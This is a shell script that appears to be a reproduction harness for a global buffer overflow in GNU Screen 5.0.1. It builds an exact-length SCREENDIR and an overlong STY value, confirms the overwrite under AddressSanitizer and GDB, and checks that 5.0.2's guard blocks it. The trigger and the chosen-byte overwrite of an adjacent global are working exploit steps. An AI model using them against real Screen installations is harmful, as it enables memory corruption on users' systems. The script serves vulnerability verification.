#!/bin/sh
# Real-binary replay: Screen 5.0.1 global overflow vs 5.0.2 guard, plus GDB
# observation of chosen bytes in the real adjacent global. Loopback/local only.
set -eu
cd "$(dirname "$0")/.."
sha256sum -c SHA256SUMS >/dev/null
for arm in vuln-asan fixed-asan vuln-asanrec; do
    test -x "build-$arm/screen" || { echo "run harness/build.sh first"; exit 1; }
done

WORK="$PWD/probe"
mkdir -p "$WORK"

# Deterministic deep directory: total SCREENDIR length exactly 3899 bytes.
deep="$WORK/deep"
rm -rf "$deep"
mkdir -p "$deep"
p="$deep"
while [ ${#p} -lt 3643 ]; do
    comp=$(printf 'a%.0s' $(seq 1 200))
    p="$p/$comp"
    mkdir "$p"
done
need=$((3899 - ${#p} - 1))
if [ "$need" -lt 1 ] || [ "$need" -gt 255 ]; then
    echo "checkout prefix too long for a 3899-byte SCREENDIR"
    exit 1
fi
comp=$(printf 'a%.0s' $(seq 1 "$need"))
p="$p/$comp"
mkdir "$p"
sp="$p"

sty300=$(printf 'C%.0s' $(seq 1 300))
sty600=$(printf 'C%.0s' $(seq 1 600))
pass=0
fail=0
check() {
    if [ "$1" -eq 1 ]; then pass=$((pass + 1)); echo "PASS $2"
    else fail=$((fail + 1)); echo "FAIL $2"; fi
}

run_screen() {
    name=$1 dir=$2 sty=$3
    set +e
    (cd "$dir" && SCREENDIR="$sp" STY="$sty" TERM=dumb \
      ASAN_OPTIONS=detect_leaks=0 timeout 30 ./screen -X echo hi \
      > "$WORK/$name.raw" 2>&1)
    echo $? > "evidence/$name.rc"
    set -e
}

run_screen vuln-asan build-vuln-asan "$sty300"
run_screen fixed-asan build-fixed-asan "$sty300"
run_screen vuln-safe build-vuln-asan ok

set +e
SCREENDIR="$sp" STY="$sty600" TERM=dumb \
  ASAN_OPTIONS=halt_on_error=0:detect_leaks=0 \
  gdb -q -batch -x harness/gdb-victim-map.cmd build-vuln-asanrec/screen \
  > "$WORK/gdb-chosen.raw" 2>&1
echo $? > evidence/gdb-chosen.rc
set -e

sed -E -e 's/==[0-9]+==//g' -e 's/0x[0-9a-f]+/ADDR/g' \
  -e 's#[^ ]*/build-[a-z-]*/attacher.c#attacher.c#g' \
  -e 's#[^ ]*/build-[a-z-]*/screen.c#screen.c#g' \
  "$WORK/vuln-asan.raw" | grep -E \
  'ERROR: AddressSanitizer|WRITE of size|is located|in SendCmdMessage|in main|SUMMARY' \
  > evidence/vuln-asan-stable.out
grep -E 'Socket path too long|AddressSanitizer' "$WORK/fixed-asan.raw" \
  > evidence/fixed-asan-stable.out || true
grep -E 'AddressSanitizer' "$WORK/vuln-safe.raw" \
  > evidence/vuln-safe-stable.out || true
grep -E 'SOCKETPATH_LEN|ATTACK_STY_LEN|BYTES' "$WORK/gdb-chosen.raw" \
  > evidence/gdb-chosen-stable.out || true

check "$(grep -c 'ERROR: AddressSanitizer: global-buffer-overflow' evidence/vuln-asan-stable.out)" vuln-asan-global-overflow
check "$(grep -c 'WRITE of size 302' evidence/vuln-asan-stable.out)" vuln-asan-write-size
check "$(grep -c "0 bytes after global variable 'SocketPath'" evidence/vuln-asan-stable.out)" vuln-asan-socketpath-end
check "$(grep -c "62 bytes before global variable 'attach_tty_name_in_ns'" evidence/vuln-asan-stable.out)" vuln-asan-real-neighbor
check "$(grep -c 'in SendCmdMessage .*attacher.c:434' evidence/vuln-asan-stable.out)" vuln-asan-sink-line
check "$(grep -c 'in main .*screen.c:950' evidence/vuln-asan-stable.out)" vuln-asan-real-caller
check "$(grep -c 'Socket path too long' evidence/fixed-asan-stable.out)" fixed-asan-guard
check "$(grep -c 'AddressSanitizer' evidence/fixed-asan-stable.out | grep -c '^0$')" fixed-asan-clean
check "$(grep -c 'AddressSanitizer' evidence/vuln-safe-stable.out | grep -c '^0$')" vuln-safe-clean
check "$(grep -c 'SOCKETPATH_LEN=4500' evidence/gdb-chosen-stable.out)" gdb-socketpath-len
check "$(grep -c 'ATTACK_STY_LEN=600' evidence/gdb-chosen-stable.out)" gdb-sty-len
check "$(grep -c '^BYTES.*0x43 0x43 0x43 0x43 0x43 0x43 0x43 0x43 0x43' evidence/gdb-chosen-stable.out)" gdb-nine-chosen-offsets
check "$(sha256sum -c evidence/SHA256SUMS 2>/dev/null | grep -c ': OK$' | grep -c '^[1-9]')" evidence-pins
sha256sum -c SHA256SUMS >/dev/null
if [ "$fail" -eq 0 ]; then echo "RUN_ALL_OK $pass PASS / $fail FAIL"
else echo "RUN_ALL_FAIL $pass PASS / $fail FAIL"; exit 1; fi
